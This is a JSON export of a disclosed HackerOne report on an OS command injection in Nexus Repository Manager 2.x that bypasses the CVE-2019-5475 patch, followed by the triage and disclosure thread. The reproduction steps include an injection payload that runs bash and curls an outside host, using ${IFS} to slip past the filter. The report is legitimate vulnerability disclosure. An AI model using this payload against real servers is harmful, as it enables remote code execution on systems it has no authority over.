{"id":688270,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82ODgyNzA=","url":"https://hackerone.com/reports/688270","title":"OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-09-05T03:25:50.622Z","submitted_at":"2019-09-05T03:25:50.622Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"badcode_","url":"/badcode_","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":35524,"url":"https://hackerone.com/central-security-project","handle":"central-security-project","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Central Security Project","twitter_handle":"SaferOpenSource","website":"https://www.sonatype.com/central-security-project","about":"Ensuring Safer Open Source Across Ecosystems"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-15588","CVE-2019-5475"],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-29T11:03:48.386Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-28T18:58:11.671Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)\n\n# Maven artifact\n\n**groupId:** org.sonatype.nexus.plugins\n**artifactId:** nexus-yum-repository-plugin\n**version:** 2.14.14-01\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability.\n\n## Additional Details\n\nTake a look at the patch for CVE-2019-5475\n\n https://github.com/sonatype/nexus-public/commit/7b9939e71693422d3e09adc3744fa2e9b3a62a63#diff-4ab0523de106ac7a38808f0231fc8a23R84\n\n![](1.png)\n\nThe `getCleanCommand` method is not completely filtered and can still be bypassed.\n\n\n\n## Steps To Reproduce:\n\n1. Navigate to \"Capabilities\" in Nexus Repository Manager.\n\n2. Edit or create a new Yum: Configuration capability\n\n3. Set path of \"createrepo\" or \"mergerepo\" to an OS command (e.g. `/bin/bash -c curl${IFS}http://192.168.88.1:8000/ || /createrepo`)\n\n   \n\n![](2.png)\n\n\n\n## Supporting Material/References:\n\n- Ubuntu\n- Sonatype Nexus Repository Manager 2.14.14-01\n- Java 8\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nAn authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.\n\n## Impact\n\nAn authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":575210,"file_name":"2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bW8po4yW1wjuWWpRa9jXb7Dv?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151752Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1f8abab5a0fec614118bcf6b3f600b5a6af54dcff4601d5d2997882d8a033e71","file_size":113328,"type":"image/png"},{"id":575211,"file_name":"1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/S5S3CctLKLo5x3TokbPbWz3F?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151752Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7812fa788ea2a69a3ce246cfe1f137cae38a997e0772a52c083e06902706a40a","file_size":67810,"type":"image/png"}],"allow_singular_disclosure_at":"2019-11-27T18:58:11.771Z","allow_singular_disclosure_after":-59084380.34843904,"singular_disclosure_allowed":true,"vote_count":34,"voters":["michiel","base_64","sameerphad72","spam404","mik317","giany","qtros","dmc3","dolph1n","noob_07","and 24 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":17122,"asset_type":"SOURCE_CODE","asset_identifier":"Java Component in search.maven.org","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5741853,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@badcode_ Thank you for your submission.  We are validating your issue and will reply back shortly.","automated_response":false,"created_at":"2019-09-05T19:15:45.393Z","updated_at":"2019-09-05T19:15:45.393Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5787143,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Have you verified this vulnerability?","automated_response":false,"created_at":"2019-09-12T02:12:12.290Z","updated_at":"2019-09-12T02:12:12.290Z","actor":{"username":"badcode_","cleared":false,"url":"/badcode_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5791281,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@badcode_ Yes and a fix is pending review now.  How would you like to be credited?","automated_response":false,"created_at":"2019-09-12T13:26:19.801Z","updated_at":"2019-09-12T13:26:19.801Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5791868,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, Badcode \u0026 Longofo of Knownsec 404 Team","automated_response":false,"created_at":"2019-09-12T14:55:55.947Z","updated_at":"2019-09-12T14:55:55.947Z","actor":{"username":"badcode_","cleared":false,"url":"/badcode_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5887658,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2019-09-25T14:22:57.535Z","updated_at":"2019-09-25T14:22:57.535Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6155183,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This vulnerability has been fixed and https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-OS-Command-Injection-2019-08-09 has been updated to reflect the appropriate affected and fixed versions along with credit to the researchers that reported this bypass.","automated_response":false,"created_at":"2019-10-28T14:49:31.528Z","updated_at":"2019-10-28T14:49:31.528Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6157107,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2019-10-28T17:42:03.839Z","updated_at":"2019-10-28T17:42:03.839Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"badcode_","url":"/badcode_"},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6157120,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Does this vulnerability have CVE ID?","automated_response":false,"created_at":"2019-10-28T17:44:17.466Z","updated_at":"2019-10-28T17:44:17.466Z","actor":{"username":"badcode_","cleared":false,"url":"/badcode_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6157230,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"HackerOne will be assigning a CVE shortly.","automated_response":false,"created_at":"2019-10-28T18:00:13.350Z","updated_at":"2019-10-28T18:00:13.350Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6157686,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @badcode_,\n\nAs part of the CVE assignment process, we'd like to publicly disclose this report. Is there any information you'd like us to redact before doing so?\n\nThanks","automated_response":false,"created_at":"2019-10-28T18:58:11.697Z","updated_at":"2019-10-28T18:58:11.697Z","first_to_agree":true,"actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6159072,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No, thanks","automated_response":false,"created_at":"2019-10-28T23:03:32.555Z","updated_at":"2019-10-28T23:03:32.555Z","actor":{"username":"badcode_","cleared":false,"url":"/badcode_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6162899,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2019-10-29T11:03:48.296Z","updated_at":"2019-10-29T11:03:48.296Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":18672,"category":"team","content":"https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-OS-Command-Injection-2019-08-09","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":429706,"username":"acazzolla","name":"Adam Cazzolla","bio":null,"cleared":false,"website":null,"location":null,"created_at":"2018-12-07T21:38:26.465Z","url":"https://hackerone.com/acazzolla","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"company","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}